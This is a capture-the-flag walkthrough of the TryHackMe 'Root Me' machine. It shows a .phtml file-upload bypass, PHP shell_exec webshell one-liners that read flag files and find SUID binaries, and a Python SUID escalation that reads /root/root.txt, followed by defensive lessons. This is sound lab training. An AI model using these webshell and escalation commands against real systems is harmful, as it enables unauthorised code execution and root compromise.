# 🟩Root Me - Try Hack Me (THM) Walkthrough Report    

**Prepared by:** Nishanth Antony
**Date:** August 11, 2025  
**Difficulty:** Easy  
**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Web Exploitation / Privilege Escalation  

---

## 📋 Executive Summary  

The **Root Me** TryHackMe machine was successfully exploited through insecure file upload functionality and privilege escalation via an SUID misconfiguration.  
By bypassing file upload restrictions, achieving remote code execution, and leveraging a Python SUID binary, full system compromise was achieved — including capture of both **user** and **root** flags.  

---

## 🎯 Scope  

Conduct an external penetration test on the *Root Me* box to:  
- Identify open services.  
- Exploit web upload vulnerabilities to gain a foothold.  
- Escalate privileges to root.  
- Extract sensitive flags.  

---

## 🚨 Key Vulnerabilities  

| Vulnerability                  | Impact                                           | Fix                                                    |
|--------------------------------|--------------------------------------------------|--------------------------------------------------------|
| Insecure File Upload           | Allowed arbitrary script upload and execution    | Restrict allowed file types, verify MIME type server-side |
| Weak File Validation Logic     | Bypassed `.php` restriction with `.phtml`         | Implement stricter file whitelist with server-side checks |
| SUID Misconfigured Binary      | Python executable allowed privilege escalation   | Remove SUID from interpreters or limit executable permissions |

---

## 🛠 Exploitation Steps  

### **1. Reconnaissance**  
- **Command:**
```bash
nmap -sV <target_ip>
```

text
- **Finding:** Open port **80** (HTTP) serving a website with file upload functionality.

---

### **2. File Upload Bypass**  
- The upload form blocked `.php` files.  
- **Bypass Method:** Uploaded a malicious `.phtml` file.  
- **Tool Used:** *Burp Suite* to intercept the request and change the file extension from `.php` to `.phtml`.  

---

### **3. Remote Code Execution**  
- **Test Command:**
```php
<?php echo shell_exec("ls -l"); ?>
```
text
Confirmed the `.phtml` file was being executed by the server.

- **User Flag Command:**
```php
<?php echo shell_exec("find / -name user.txt 2>/dev/null -exec cat {} \;"); ?>
```
text
Captured **user.txt**.

---

### **4. Privilege Escalation**  
- **SUID Check:**
```php
<?php echo shell_exec("find / -user root -perm /4000 2>/dev/null"); ?>
```
text
Found `/usr/bin/python2.7` with SUID bit.

- **Exploit Command:**
```php
<?php echo shell_exec('/usr/bin/python2.7 -c \'import os,sys; os.setuid(0); sys.stdout.write(open("/root/root.txt","r").read())\' 2>&1'); ?>
```
text
Captured **root.txt**.

---

## 🧠 Lessons Learned  

- Secure file upload features by validating **both extension and MIME type** server-side.  
- Avoid allowing interpreters (Python, Perl, Bash) to have the SUID bit set.  
- Use principle of least privilege to prevent privilege escalation.  

---

## 💻 Skills Demonstrated  

- Service enumeration (`nmap`)  
- File upload bypass (extension manipulation + Burp Suite)  
- PHP webshell exploitation  
- Privilege escalation via SUID Python binary  

---

## 🛠 Tools Used  

- **nmap** – service discovery  
- **Burp Suite** – request interception & file extension modification  
- **PHP Webshell** – remote command execution  
- **find** – system search for flags and SUID binaries  

---

## 🌟 Final Thoughts  

The Root Me machine demonstrates how insecure file upload functionality combined with poor privilege management can lead to total system compromise. Proper input validation, service hardening, and permission auditing are crucial to protecting against such attacks.
